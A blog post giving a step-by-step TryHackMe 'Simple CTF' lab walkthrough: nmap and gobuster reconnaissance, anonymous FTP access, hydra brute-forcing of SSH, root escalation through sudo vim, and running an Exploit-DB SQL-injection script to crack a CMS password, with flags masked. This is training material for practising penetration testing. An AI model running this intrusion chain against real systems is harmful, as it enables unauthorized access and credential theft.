@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="THM - EasyCTF/SimpleCTF Writeup Welcome to my second write-up for a TryHackme machine, in this case we&amp;rsquo;ll be solving EasyCTF or should I say SimpleCTF It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules." />
+<meta name="keywords" content=", hacking, tryHackme, writeups" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://tzero86-bits.netlify.app/posts/easyctf_writeup/" />
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-175520987-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+    <title>
+        
+            EasyCTF_writeup.sh :: tzero86.bits  — hacking notes, tools and rants.
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.2.1/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d1ea4af8fd04fb24a4f8b882ea54bd04eb245427ca4baf527c81a5dab071410b.css">
+
+
+
+
+
+
+<meta itemprop="name" content="EasyCTF_writeup.sh">
+<meta itemprop="description" content="THM - EasyCTF/SimpleCTF Writeup Welcome to my second write-up for a TryHackme machine, in this case we&rsquo;ll be solving EasyCTF or should I say SimpleCTF It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules.">
+<meta itemprop="datePublished" content="2020-08-21T14:37:34-04:00" />
+<meta itemprop="dateModified" content="2020-08-21T14:37:34-04:00" />
+<meta itemprop="wordCount" content="1890">
+<meta itemprop="image" content="https://tzero86-bits.netlify.app/"/>
+
+
+
+<meta itemprop="keywords" content="hacking,tryHackme,writeups," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://tzero86-bits.netlify.app/"/>
+
+<meta name="twitter:title" content="EasyCTF_writeup.sh"/>
+<meta name="twitter:description" content="THM - EasyCTF/SimpleCTF Writeup Welcome to my second write-up for a TryHackme machine, in this case we&rsquo;ll be solving EasyCTF or should I say SimpleCTF It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.
+ Please visit This room on TryHackMe by clicking this link. PLEASE NOTE: Passwords and flag values were intentionally masked as required by THM writeups rules."/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2020-08-21 14:37:34 -0400 EDT" />
+
+
+
+
+
+
+
+
+    </head>
+
+    <body class="dark-theme">
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">tzero86.bits</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://tzero86-bits.netlify.app/page/about/">About me</a></li><li><a href="https://tzero86-bits.netlify.app/posts/">Blog Posts</a></li><li><a href="https://tzero86-bits.netlify.app/">Home</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+
+            <span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+</span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        9 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://tzero86-bits.netlify.app/posts/easyctf_writeup/">EasyCTF_writeup.sh</a>
+      </h1>
+
+      
+        <img src="/img/easyCTF_cover.png" class="post-cover" />
+      
+
+      <div class="post-content">
+        <h2 id="thm---easyctfsimplectf-writeup">THM - EasyCTF/SimpleCTF Writeup</h2>
+<p>Welcome to my second write-up for a TryHackme machine, in this case we&rsquo;ll be solving <strong>EasyCTF</strong> or should I say <strong>SimpleCTF</strong> It seems to be called as both by looking at the room name and URL. Anyways, I invite you to try out this room on TryHackme by following the link below.</p>
+<ul>
+<li>Please visit This room on TryHackMe by <a href="https://tryhackme.com/room/easyctf">clicking this link</a>.</li>
+<li><strong>PLEASE NOTE:</strong> Passwords and flag values were intentionally masked as required by THM writeups rules. The write-up follows my step by step solution to this box, errors and all.</li>
+</ul>
+<blockquote>
+<p>Question #1: How many services are running under port 1000?</p>
+</blockquote>
+<p>First let&rsquo;s fire up a <strong>Nmap</strong> scan to see if we can identify any services, making sure we skip the initial ping <strong>[-Pn]</strong>, scan all ports <strong>[-p-]</strong>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ sudo nmap -A -Pn -p- -T4  10.10.251.248
+<span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> tzero86: 
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-08-20 20:06 EDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.251.248
+Host is up <span style="color:#f92672">(</span>0.35s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">65533</span> filtered ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span style="color:#f92672">(</span>FTP code 230<span style="color:#f92672">)</span>
+|_Can<span style="color:#960050;background-color:#1e0010">&#39;</span>t get directory listing: TIMEOUT
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:10.13.0.34
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is <span style="color:#ae81ff">300</span>
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was <span style="color:#ae81ff">2</span>
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-robots.txt: <span style="color:#ae81ff">2</span> disallowed entries 
+|_/ /openemr-5_0_1_3 
+|_http-server-header: Apache/2.4.18 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Apache2 Ubuntu Default Page: It works
+Warning: OSScan results may be unreliable because we could not find at least <span style="color:#ae81ff">1</span> open and <span style="color:#ae81ff">1</span> closed port
+Aggressive OS guesses: Linux 3.10 - 3.13 <span style="color:#f92672">(</span>92%<span style="color:#f92672">)</span>, Crestron XPanel control system    <span style="color:#f92672">(</span>90%<span style="color:#f92672">)</span>, ASUS RT-N56U WAP <span style="color:#f92672">(</span>Linux 3.4<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 3.1 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 3.16 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, L  inux 3.2 <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, HP P2000 G3 NAS device <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, AXIS 210A or <span style="color:#ae81ff">211</span> Network Camera <span style="color:#f92672">(</span> Linux 2.6.17<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>87%<span style="color:#f92672">)</span>, Linux 2.6.32 <span style="color:#f92672">(</span>86%<span style="color:#f92672">)</span>, Infomir MAG-250 set-top box <span style="color:#f92672">(</span>86%<span style="color:#f92672">)</span>      
+No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>test conditions non-ideal<span style="color:#f92672">)</span>.                       
+Network Distance: <span style="color:#ae81ff">4</span> hops                                                        
+Service Info: OS: Unix
+
+TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>
+HOP RTT       ADDRESS
+<span style="color:#ae81ff">1</span>   234.68 ms 10.13.0.1
+<span style="color:#ae81ff">2</span>   ... <span style="color:#ae81ff">3</span>
+<span style="color:#ae81ff">4</span>   376.88 ms 10.10.251.248
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 540.83 seconds
+</code></pre></div><p>With this scan we now we have two services running (under port 1000):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>1<span style="color:#f92672">]</span> <span style="color:#ae81ff">21</span> - vsFTPd 3.0.3
+<span style="color:#f92672">[</span>2<span style="color:#f92672">]</span> 80/tcp open  http    Apache httpd 2.4.18 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+</code></pre></div><p>Our extended scan with <strong>autorecon</strong> was returned SSH on port 2222 as well:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ autorecon 10.10.251.248                                                <span style="color:#ae81ff">1</span> 
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Scanning target 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-top-20-udp on 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-quick on 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Running service detection nmap-full-tcp on 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>20:10:28<span style="color:#f92672">]</span> - There are <span style="color:#ae81ff">2</span> tasks still running on 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Service detection nmap-quick on 10.10.251.248 finished successfully in <span style="color:#ae81ff">1</span> minute, <span style="color:#ae81ff">1</span> second
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ftp on tcp/21 on target 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found http on tcp/80 on target 10.10.251.248
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Found ssh on tcp/2222 on target 10.10.251.248
+</code></pre></div><p>And with this scan we can answer the second question.</p>
+<blockquote>
+<p>Question #2: What is running on the higher port?</p>
+</blockquote>
+<p>Let&rsquo;s move on to the next one.</p>
+<blockquote>
+<p>Question #3: What&rsquo;s the CVE you&rsquo;re using against the application?</p>
+</blockquote>
+<p>So we need to look for a vulnerability to exploit. Let&rsquo;s see if we can find anything related to <strong>vsFTPd 3.0.3</strong> or related to <strong>Apache HTTPd 2.4.18</strong>.</p>
+<p>The first thing we know about the FTP service running on port 21 is that it has anonymous access enabled. So let&rsquo;s connect to it and maybe download all the files if there is anything interesting that can aid us.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ ftp  10.10.251.248 <span style="color:#ae81ff">21</span>                                            
+Connected to 10.10.251.248.
+<span style="color:#ae81ff">220</span> <span style="color:#f92672">(</span>vsFTPd 3.0.3<span style="color:#f92672">)</span>
+Name <span style="color:#f92672">(</span>10.10.251.248:tzero86<span style="color:#f92672">)</span>: anonymous
+<span style="color:#ae81ff">230</span> Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp&gt; dir
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+drwxr-xr-x    <span style="color:#ae81ff">2</span> ftp      ftp          <span style="color:#ae81ff">4096</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> pub
+<span style="color:#ae81ff">226</span> Directory send OK.
+ftp&gt; cd pub
+<span style="color:#ae81ff">250</span> Directory successfully changed.
+ftp&gt; ls
+<span style="color:#ae81ff">200</span> PORT command successful. Consider using PASV.
+<span style="color:#ae81ff">150</span> Here comes the directory listing.
+-rw-r--r--    <span style="color:#ae81ff">1</span> ftp      ftp           <span style="color:#ae81ff">166</span> Aug <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">2019</span> ForMitch.txt
+<span style="color:#ae81ff">226</span> Directory send OK.
+</code></pre></div><p>As we can see there is a potentially interesting file called <strong>ForMitch.txt</strong>, which at the very least already gives us one username to try on the SSH port.</p>
+<p>Let&rsquo;s download the file from the FTP, we can use this command to download all files directly:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF/FTPFiles<span style="color:#f92672">]</span>
+└─$ wget -m --no-passive ftp://anonymous:anonymous@10.10.251.248                         
+--2020-08-20 20:39:42--  ftp://anonymous:*password*@10.10.251.248/
+<span style="color:#f92672">=</span>&gt; ‘10.10.251.248/.listing’
+Connecting to 10.10.251.248:21... connected.
+Logging in as anonymous ... Logged in!
+<span style="color:#f92672">==</span>&gt; SYST ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; PWD ... <span style="color:#66d9ef">done</span>.
+<span style="color:#f92672">==</span>&gt; TYPE I ... <span style="color:#66d9ef">done</span>.  <span style="color:#f92672">==</span>&gt; CWD not needed.
+<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; LIST ... <span style="color:#66d9ef">done</span>.
+10.10.251.248/.listing      <span style="color:#f92672">[</span> &lt;<span style="color:#f92672">=</span>&gt;                           <span style="color:#f92672">]</span>     <span style="color:#ae81ff">180</span>  --.-KB/s    in 0s      
+2020-08-20 20:39:46 <span style="color:#f92672">(</span>33.6 MB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/.listing’ saved <span style="color:#f92672">[</span>180<span style="color:#f92672">]</span>
+--2020-08-20 20:39:46--  ftp://anonymous:*password*@10.10.251.248/pub/
+<span style="color:#f92672">=</span>&gt; ‘10.10.251.248/pub/.listing’
+<span style="color:#f92672">==</span>&gt; CWD <span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> /pub ... <span style="color:#66d9ef">done</span>.
+<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; LIST ... <span style="color:#66d9ef">done</span>.
+
+10.10.251.248/pub/.list     <span style="color:#f92672">[</span> &lt;<span style="color:#f92672">=</span>&gt;                           <span style="color:#f92672">]</span>     <span style="color:#ae81ff">189</span>  --.-KB/s    in 0s      
+
+2020-08-20 20:39:48 <span style="color:#f92672">(</span>39.3 MB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/pub/.listing’ saved <span style="color:#f92672">[</span>189<span style="color:#f92672">]</span>
+
+--2020-08-20 20:39:48--  ftp://anonymous:*password*@10.10.251.248/pub/ForMitch.txt
+           <span style="color:#f92672">=</span>&gt; ‘10.10.251.248/pub/ForMitch.txt’
+<span style="color:#f92672">==</span>&gt; CWD not required.
+<span style="color:#f92672">==</span>&gt; PORT ... <span style="color:#66d9ef">done</span>.    <span style="color:#f92672">==</span>&gt; RETR ForMitch.txt ... <span style="color:#66d9ef">done</span>.
+Length: <span style="color:#ae81ff">166</span>
+
+10.10.251.248/pub/ForMi 100%<span style="color:#f92672">[==============================</span>&gt;<span style="color:#f92672">]</span>     <span style="color:#ae81ff">166</span>  --.-KB/s    in 0s      
+
+2020-08-20 20:39:49 <span style="color:#f92672">(</span><span style="color:#ae81ff">345</span> KB/s<span style="color:#f92672">)</span> - ‘10.10.251.248/pub/ForMitch.txt’ saved <span style="color:#f92672">[</span>166<span style="color:#f92672">]</span>
+
+FINISHED --2020-08-20 20:39:49--
+Total wall clock time: 7.1s
+Downloaded: <span style="color:#ae81ff">3</span> files, <span style="color:#ae81ff">535</span> in 0s <span style="color:#f92672">(</span>1.06 MB/s<span style="color:#f92672">)</span>
+
+</code></pre></div><p>When we open the file we get another bit of information, Mitch seems to have a very bad habit of using weak passwords.</p>
+<pre><code>Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
+</code></pre><p>So lets attempt to crack it, shall we? Since we know <strong>mitch</strong> is probably a valid username, let&rsquo;s try to crack the SSH login with <strong>hydra</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ hydra -l mitch -P <span style="color:#e6db74">&#34;/usr/share/seclists/Passwords/Common-Credentials/best110.txt&#34;</span> -e nsr -s <span style="color:#ae81ff">2222</span> -o <span style="color:#e6db74">&#34;/home/kali/Documents/THM/easyCTF/results/10.10.251.248/scans/tcp_2222_ssh_hydra.txt&#34;</span> ssh://10.10.49.87
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-21 13:04:27
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t <span style="color:#ae81ff">4</span>
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">113</span> login tries <span style="color:#f92672">(</span>l:1/p:113<span style="color:#f92672">)</span>, ~8 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking ssh://10.10.49.87:2222/
+<span style="color:#f92672">[</span>2222<span style="color:#f92672">][</span>ssh<span style="color:#f92672">]</span> host: 10.10.49.87   login: mitch   password: ******
+<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-08-21 13:05:22
+</code></pre></div><p>There we go, we have a user and pass to connect to SSH. With this we can answer the following room questions:</p>
+<blockquote>
+<p>Question #5 What&rsquo;s the password?</p>
+</blockquote>
+<blockquote>
+<p>Question #6 Where can you login with the details obtained?</p>
+</blockquote>
+<p>Let&rsquo;s check the SSH login out:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ ssh mitch@10.10.49.87 -p <span style="color:#ae81ff">2222</span>                                                                                              <span style="color:#ae81ff">255</span> ⨯
+The authenticity of host <span style="color:#e6db74">&#39;[10.10.49.87]:2222 ([10.10.49.87]:2222)&#39;</span> can<span style="color:#e6db74">&#39;t be established.
+</span><span style="color:#e6db74">ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
+</span><span style="color:#e6db74">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+</span><span style="color:#e6db74">Warning: Permanently added &#39;</span><span style="color:#f92672">[</span>10.10.49.87<span style="color:#f92672">]</span>:2222<span style="color:#e6db74">&#39; (ECDSA) to the list of known hosts.
+</span><span style="color:#e6db74">mitch@10.10.49.87&#39;</span>s password: 
+Welcome to Ubuntu 16.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 4.15.0-58-generic i686<span style="color:#f92672">)</span>
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+<span style="color:#ae81ff">0</span> packages can be updated.
+<span style="color:#ae81ff">0</span> updates are security updates.
+
+Last login: Mon Aug <span style="color:#ae81ff">19</span> 18:13:41 <span style="color:#ae81ff">2019</span> from 192.168.0.190
+$ ls
+user.txt
+$ cat user.txt
+<span style="color:#f92672">{</span>User_flag_value_here<span style="color:#f92672">}</span>
+$ cd ..
+$ ls
+mitch  sunbath
+$ 
+</code></pre></div><p>Let&rsquo;s review where we are at. We managed to get into the FTP server with anonymous login, we download a file for Mitch and got information that he uses bad insecure passwords. We then used Hydra to brute force the password and got the SSH password. We logged into SSH as Mitch and found out the user.txt value. We also know from looking a bit on the SSH, there is another username <strong>sunbath</strong>.</p>
+<p>With this we can answer some questions from the room already. Still no idea what CVE we should be using for Question 2. But we can answer the following:</p>
+<blockquote>
+<p>Question #7: What&rsquo;s the user flag?</p>
+</blockquote>
+<blockquote>
+<p>Question #8: Is there any other user in the home directory? What&rsquo;s its name?</p>
+</blockquote>
+<p>The next question ask us if we can use anything to leverage root privileges, let&rsquo;s check in the current SSH session if our user <strong>mitch</strong> has any access:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo -l
+User mitch may run the following commands on Machine:
+    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/vim
+</code></pre></div><p>This let us answer question 9:</p>
+<blockquote>
+<p>Question #9: What can you leverage to spawn a privileged shell?</p>
+</blockquote>
+<p>We now know Mitch can run <strong>vim</strong> as root. Once inside vim we press <strong>ESC</strong> then type in <strong>:!bash</strong> and press enter, just follow my steps and shown below:</p>
+<p><img src="/img/Vim_Exploit_Sudo.gif" alt="Priv Esc with vim running as sudo"></p>
+<p>After that we can just review a bit to see what we find. From the room&rsquo;s question we know we need to locate the root flag. So let&rsquo;s browse to the root folder and see if it is there:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@Machine:/root# ls
+root.txt
+root@Machine:/root# cat root.txt
+<span style="color:#f92672">{</span>The_Root_Flag_Value_here<span style="color:#f92672">}</span>
+root@Machine:/root# 
+</code></pre></div><p>Having found a way to get root access, we can now answer the question 10.</p>
+<blockquote>
+<p>Question #10: What&rsquo;s the root flag?</p>
+</blockquote>
+<p>But we are still missing the CVE number answer to question #3 and also the answer to question #4. It seems we need to find some additional information. These are the questions still pending:</p>
+<blockquote>
+<p>Question #3: What&rsquo;s the CVE you&rsquo;re using against the application?</p>
+</blockquote>
+<blockquote>
+<p>Question #4: To what kind of vulnerability is the application vulnerable?</p>
+</blockquote>
+<p>Maybe we missed something but we surely forgot to run a <strong>gobuster</strong> scan. Let&rsquo;s do that now:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ gobuster dir -u http://10.10.49.87/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.49.87/
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">10</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+<span style="color:#f92672">===============================================================</span>
+2020/08/21 14:48:02 Starting gobuster
+<span style="color:#f92672">===============================================================</span>
+/simple <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+
+</code></pre></div><p>This will take some time. Let&rsquo;s see what&rsquo;s that <strong>/simple</strong> directory about.</p>
+<p><img src="https://imgur.com/IjeZ6cvl.png" alt="We get a Simple CMS welcome page"></p>
+<p>So we have a Simple CMS running on the machine and we even get pointed to <strong>/simple/admin/</strong> to log in.</p>
+<p><img src="https://imgur.com/mZDKOlYl.png" alt="We get an admin login panel"></p>
+<p>Let&rsquo;s see if we can find any CVE for this CMS.</p>
+<p>Looking on Exploit-DB we get an SQL injection CVE:</p>
+<p><img src="https://i.imgur.com/evabUPI.png" alt="CVE for this CMS"></p>
+<p>Let&rsquo;s download this python exploit file and see what it does. In this case I renamed the exploit as <strong>exploit.py</strong></p>
+<p>First we need to make this file executable and then we can run our exploit. Also note that this script runs with <strong>python2</strong> and not with <strong>python3</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>tzero86㉿tzbox<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/easyCTF<span style="color:#f92672">]</span>
+└─$ python exploit.py --u http://10.10.49.87/simple/ --crack -w /usr/share/wordlists/rockyou.txt
+
+</code></pre></div><p>This script is very unreliable, it crashes a lot. In the end we should see something like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try: 1di
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Try: 1do
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Salt <span style="color:#66d9ef">for</span> password found: *************
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Username found: mitch
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Email found: admin@admin.com
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password found: ***********************
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Password cracked: ******
